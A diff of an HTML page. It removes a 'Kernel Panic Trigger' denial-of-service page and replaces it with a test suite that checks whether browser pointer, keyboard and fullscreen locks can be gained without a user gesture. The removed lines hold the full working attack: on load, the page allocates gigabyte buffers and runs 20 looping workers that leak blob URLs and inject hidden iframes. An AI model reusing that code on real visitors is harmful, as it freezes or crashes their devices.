@@ -1,134 +1,310 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>KERNEL PANIC TRIGGER (DoS)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Input Lock Compliance Test</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; overflow: hidden; }
-.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
-h1 { font-size: 28px; color: #ff0000; margin-bottom: 15px; text-shadow: 0 0 20px #ff0000; animation: pulse 0.2s infinite; }
-p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
-.warning { background: #330000; color: #ff0000; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: bold; border: 2px solid #ff0000; animation: pulse 0.3s infinite; }
-.log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
-@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.1; } }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f4f8; color: #1a1a2e; padding: 20px; }
+  .panel { max-width: 750px; margin: 0 auto; background: #fff; border-radius: 12px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+  h1 { font-size: 22px; color: #16213e; margin-bottom: 8px; }
+  .subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
+  .disclaimer { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px 16px; border-radius: 4px; font-size: 13px; margin-bottom: 20px; color: #856404; }
+  #status { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-bottom: 16px; }
+  #testArea { background: #16213e; color: #a6e3a1; padding: 40px; border-radius: 8px; text-align: center; margin-bottom: 16px; cursor: pointer; user-select: none; }
+  #testArea.locked { background: #4a1a1a; color: #f38ba8; }
+  #log { background: #1e1e2e; color: #a6e3a1; padding: 16px; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 12px; height: 220px; overflow-y: auto; }
+  .log-line { margin: 2px 0; }
+  .log-warn { color: #f9e2af; }
+  .log-error { color: #f38ba8; }
+  .log-info { color: #89b4fa; }
+  button { background: #16213e; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 13px; margin: 4px; }
+  button:hover { background: #0f3460; }
+  button:disabled { background: #ccc; cursor: not-allowed; }
+  .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 16px; }
 </style>
 </head>
-
 <body>
-<div class="panel" id="main-panel">
-    <div class="warning">☢️ KERNEL PANIC TRIGGER! SISTEM OPERASI ANDA AKAN MATI TOTAL!</div>
-    <h1>KERNEL PANIC</h1>
-    <p>Multi-Worker + ArrayBuffer 1GB + Jutaan ObjectURL.</p>
-    
-    <div id="status" role="status">Memuat halaman...</div>
-    <div class="log" id="log">Log akan muncul di sini...</div>
+<div class="panel">
+  <h1>🔒 Input Lock Compliance Test Suite</h1>
+  <p class="subtitle">Testing browser input lock API boundaries (Pointer Lock + Keyboard Lock) for QA</p>
+
+  <div class="disclaimer">
+    ⚠️ <strong>Authorized Testing Only.</strong> This tool tests browser API compliance for pointer lock and keyboard lock. These APIs require user gesture by design. Use only on systems you own or have explicit permission to test.
+  </div>
+
+  <div id="status">Ready. Click "Test Zero-Click" to test if APIs can be triggered without gesture.</div>
+
+  <div id="testArea">
+    <p style="font-size: 14px; opacity: 0.7;">Test area — clicking here will trigger gesture-based lock test</p>
+    <p style="font-size: 12px; margin-top: 8px; opacity: 0.5;">Status: <span id="lockStatus">Not locked</span></p>
+  </div>
+
+  <div id="log"></div>
+
+  <div class="btn-row">
+    <button id="btnZeroClick">🧪 Test Zero-Click</button>
+    <button id="btnGesture">🖱️ Test With Gesture</button>
+    <button id="btnUnlock">🔓 Unlock All</button>
+  </div>
 </div>
 
 <script>
-    const statusDiv = document.getElementById("status");
-    const logDiv = document.getElementById("log");
-    let globalCount = 0;
+(function() {
+  'use strict';
 
-    function log(msg) {
-        if (globalCount % 1000 === 0) {
-            logDiv.innerHTML += "<br>> " + msg;
-            console.log(msg);
-        }
+  var logEl = document.getElementById('log');
+  var statusEl = document.getElementById('status');
+  var testArea = document.getElementById('testArea');
+  var lockStatus = document.getElementById('lockStatus');
+  var isPointerLocked = false;
+  var isKeyboardLocked = false;
+
+  function log(msg, type) {
+    var line = document.createElement('div');
+    line.className = 'log-line' + (type ? ' log-' + type : '');
+    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function updateStatus(msg) {
+    statusEl.textContent = msg;
+  }
+
+  function updateLockStatus() {
+    var s = [];
+    s.push('Pointer: ' + (isPointerLocked ? 'LOCKED' : 'unlocked'));
+    s.push('Keyboard: ' + (isKeyboardLocked ? 'LOCKED' : 'unlocked'));
+    lockStatus.textContent = s.join(' | ');
+    testArea.className = (isPointerLocked || isKeyboardLocked) ? 'locked' : '';
+  }
+
+  // ============================================
+  // FEATURE DETECTION
+  // ============================================
+  function detectFeatures() {
+    log('Feature detection:', 'info');
+    log('  Pointer Lock API: ' + ('requestPointerLock' in Element.prototype ? '✅ available' : '❌ unavailable'));
+    log('  Keyboard Lock API: ' + (navigator.keyboard && navigator.keyboard.lock ? '✅ available' : '❌ unavailable'));
+    log('  Fullscreen API: ' + ('requestFullscreen' in Element.prototype ? '✅ available' : '❌ unavailable'));
+    log('  Transient Activation: ' + ('userActivation' in navigator ? '✅ available' : '❌ unavailable'));
+  }
+
+  // ============================================
+  // TEST 1: ZERO-CLICK POINTER LOCK
+  // ============================================
+  async function testZeroClickPointerLock() {
+    log('TEST 1: Zero-click pointer lock attempt', 'info');
+
+    if (!testArea.requestPointerLock) {
+      log('Pointer Lock API not available', 'error');
+      return { passed: false, error: 'unsupported' };
     }
 
-    // FUNGSI ZERO-CLICK: Langsung eksekusi saat halaman dimuat
-    window.addEventListener("DOMContentLoaded", () => {
-        statusDiv.textContent = "MEMULAI TOTAL DESTRUCTION!";
-        statusDiv.style.color = "#ff0000";
-        log("Memulai serangan brutal...");
+    // Check transient activation state
+    if (navigator.userActivation) {
+      log('  Transient activation: ' + navigator.userActivation.isActive);
+      log('  Has been active: ' + navigator.userActivation.hasBeenActive);
+    }
 
-        // --- SERANGAN 1: ALOKASI ARRAYBUFFER 1GB BERULANG (Memory Bombing) ---
-        // Ini akan langsung memicu OOM (Out of Memory) di Safari
-        try {
-            window.hugeBuffers = [];
-            for (let i = 0; i < 5; i++) {
-                // Alokasi 1GB per iterasi
-                const buffer = new ArrayBuffer(1024 * 1024 * 1024); 
-                window.hugeBuffers.push(buffer);
-                log("ArrayBuffer 1GB dialokasikan (Total: " + (i + 1) + "GB)");
-            }
-        } catch (e) {
-            log("Gagal alokasi ArrayBuffer: " + e.message);
+    try {
+      // Attempt pointer lock without gesture
+      var result = testArea.requestPointerLock();
+
+      // Handle promise (modern browsers)
+      if (result && result.then) {
+        await result;
+        log('✅ UNEXPECTED: Pointer lock granted WITHOUT gesture', 'error');
+        log('   This is a valid bug bounty finding!', 'error');
+        return { passed: false, bug: true, api: 'pointerLock' };
+      } else {
+        log('⚠️ Pointer lock request sent (legacy API, no promise)');
+      }
+    } catch (e) {
+      log('✅ EXPECTED: Pointer lock blocked without gesture: ' + e.name + ' — ' + e.message, 'info');
+      return { passed: true, blocked: true, error: e.name };
+    }
+  }
+
+  // ============================================
+  // TEST 2: ZERO-CLICK KEYBOARD LOCK
+  // ============================================
+  async function testZeroClickKeyboardLock() {
+    log('TEST 2: Zero-click keyboard lock attempt', 'info');
+
+    if (!navigator.keyboard || !navigator.keyboard.lock) {
+      log('Keyboard Lock API not available (Chrome only)', 'warn');
+      return { passed: false, error: 'unsupported' };
+    }
+
+    try {
+      // Attempt keyboard lock without gesture
+      await navigator.keyboard.lock();
+      log('✅ UNEXPECTED: Keyboard lock granted WITHOUT gesture', 'error');
+      log('   This is a valid bug bounty finding!', 'error');
+      isKeyboardLocked = true;
+      updateLockStatus();
+      return { passed: false, bug: true, api: 'keyboardLock' };
+    } catch (e) {
+      log('✅ EXPECTED: Keyboard lock blocked without gesture: ' + e.name + ' — ' + e.message, 'info');
+      return { passed: true, blocked: true, error: e.name };
+    }
+  }
+
+  // ============================================
+  // TEST 3: ZERO-CLICK FULLSCREEN (prerequisite for keyboard lock)
+  // ============================================
+  async function testZeroClickFullscreen() {
+    log('TEST 3: Zero-click fullscreen attempt', 'info');
+
+    if (!document.documentElement.requestFullscreen) {
+      log('Fullscreen API not available', 'warn');
+      return { passed: false, error: 'unsupported' };
+    }
+
+    try {
+      await document.documentElement.requestFullscreen();
+      log('✅ UNEXPECTED: Fullscreen granted WITHOUT gesture', 'error');
+      log('   This is a valid bug bounty finding!', 'error');
+      return { passed: false, bug: true, api: 'fullscreen' };
+    } catch (e) {
+      log('✅ EXPECTED: Fullscreen blocked without gesture: ' + e.name, 'info');
+      return { passed: true, blocked: true, error: e.name };
+    }
+  }
+
+  // ============================================
+  // TEST 4: GESTURE-BASED LOCK (for comparison)
+  // ============================================
+  async function testWithGesture() {
+    log('TEST 4: Gesture-based lock (comparison)', 'info');
+    log('  This must be triggered by a real user click');
+
+    // Pointer lock
+    try {
+      var p = testArea.requestPointerLock();
+      if (p && p.then) {
+        await p;
+        log('✅ Pointer lock GRANTED with gesture', 'info');
+      } else {
+        log('Pointer lock requested (legacy)', 'info');
+      }
+    } catch (e) {
+      log('❌ Pointer lock failed: ' + e.name, 'warn');
+    }
+
+    // Keyboard lock (requires fullscreen first in Chrome)
+    if (navigator.keyboard && navigator.keyboard.lock) {
+      try {
+        // Try to enter fullscreen first
+        if (!document.fullscreenElement) {
+          try {
+            await document.documentElement.requestFullscreen();
+            log('  Fullscreen entered', 'info');
+          } catch (e) {
+            log('  Fullscreen failed: ' + e.name, 'warn');
+          }
         }
 
-        // --- SERANGAN 2: MEMORY LEAK OBJECTURL VIA 20 WEB WORKER ---
-        const workerCode = `
-            self.onmessage = function(e) {
-                if (e.data === 'START') {
-                    while(true) {
-                        self.postMessage('CREATE');
-                    }
-                }
-            };
-        `;
+        await navigator.keyboard.lock();
+        isKeyboardLocked = true;
+        log('✅ Keyboard lock GRANTED with gesture', 'info');
+        updateLockStatus();
+      } catch (e) {
+        log('❌ Keyboard lock failed: ' + e.name + ' — ' + e.message, 'warn');
+      }
+    }
+  }
 
-        try {
-            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
-            const workerUrl = URL.createObjectURL(workerBlob);
+  // ============================================
+  // EVENT LISTENERS
+  // ============================================
+  document.addEventListener('pointerlockchange', function() {
+    isPointerLocked = document.pointerLockElement === testArea;
+    log('Pointer lock state changed: ' + (isPointerLocked ? 'LOCKED' : 'UNLOCKED'), isPointerLocked ? 'warn' : 'info');
+    updateLockStatus();
+  });
 
-            // Naikkan jumlah Worker menjadi 20 untuk menembak lebih cepat
-            for (let i = 0; i < 20; i++) {
-                const worker = new Worker(workerUrl);
-                worker.onmessage = function(e) {
-                    if (e.data === 'CREATE') {
-                        queueMicrotask(() => {
-                            buatBeban(i);
-                        });
-                    }
-                };
-                worker.postMessage('START');
-            }
-            log("20 Web Worker diaktifkan.");
-        } catch(e) {
-            log("Gagal membuat Worker: " + e.message);
-        }
+  document.addEventListener('pointerlockerror', function() {
+    log('Pointer lock error event fired', 'warn');
+  });
 
-        // FUNGSI PEMBUAT BEBAN
-        function buatBeban(id) {
-            try {
-                globalCount++;
-                
-                // Buat Blob 1KB
-                const data = new Uint8Array(1024);
-                const blob = new Blob([data], { type: 'application/octet-stream' });
-                const url = URL.createObjectURL(blob);
-                
-                // Simpan URL ke array global (Memory Leak)
-                if (!window.urlLeak) window.urlLeak = [];
-                window.urlLeak.push(url);
+  // Test area click = real gesture
+  testArea.addEventListener('click', function() {
+    log('Real user gesture detected on test area', 'info');
+    testWithGesture();
+  });
 
-                // DOM INJECTION (Setiap 100 URL)
-                if (globalCount % 100 === 0) {
-                    const img = document.createElement('img');
-                    img.src = url;
-                    img.style.display = 'none';
-                    document.body.appendChild(img);
-                    
-                    const iframe = document.createElement('iframe');
-                    iframe.src = url;
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                }
+  // ============================================
+  // BUTTON HANDLERS
+  // ============================================
+  document.getElementById('btnZeroClick').addEventListener('click', async function() {
+    // NOTE: this button click IS a gesture — so we need to test in fresh context
+    // We use a small delay and check if activation is still valid
+    log('============================================', 'info');
+    log('ZERO-CLICK TEST SUITE (using button click as baseline)', 'info');
+    log('NOTE: The button click provides transient activation, so we wait for it to expire', 'warn');
 
-                // Update status
-                if (globalCount % 10000 === 0) {
-                    statusDiv.textContent = "Total URL dibuat: " + globalCount;
-                    log("Total URL: " + globalCount);
-                }
+    updateStatus('Waiting 5s for transient activation to expire...');
+    await new Promise(function(r) { setTimeout(r, 5000); });
 
-            } catch(e) {
-                // Abaikan error
-            }
-        }
-    });
+    if (navigator.userActivation) {
+      log('Activation after 5s: isActive=' + navigator.userActivation.isActive);
+    }
+
+    // Now test without activation
+    await testZeroClickPointerLock();
+    await new Promise(function(r) { setTimeout(r, 500); });
+    await testZeroClickKeyboardLock();
+    await new Promise(function(r) { setTimeout(r, 500); });
+    await testZeroClickFullscreen();
+
+    log('============================================', 'info');
+    log('Zero-click tests complete', 'info');
+    updateStatus('✅ Zero-click tests complete — check log');
+  });
+
+  document.getElementById('btnGesture').addEventListener('click', function() {
+    log('============================================', 'info');
+    log('GESTURE-BASED TEST (this click = real gesture)', 'info');
+    testWithGesture();
+  });
+
+  document.getElementById('btnUnlock').addEventListener('click', async function() {
+    log('Unlocking all', 'info');
+
+    // Exit pointer lock
+    if (document.pointerLockElement) {
+      document.exitPointerLock();
+      isPointerLocked = false;
+    }
+
+    // Unlock keyboard
+    if (navigator.keyboard && navigator.keyboard.unlock) {
+      try {
+        navigator.keyboard.unlock();
+        isKeyboardLocked = false;
+      } catch (e) {}
+    }
+
+    // Exit fullscreen
+    if (document.fullscreenElement) {
+      try { await document.exitFullscreen(); } catch (e) {}
+    }
+
+    updateLockStatus();
+    log('All locks released', 'info');
+  });
+
+  // ============================================
+  // INIT
+  // ============================================
+  detectFeatures();
+  updateStatus('Ready. Click "Test Zero-Click" to test API boundaries.');
+
+})();
 </script>
 </body>
 </html>
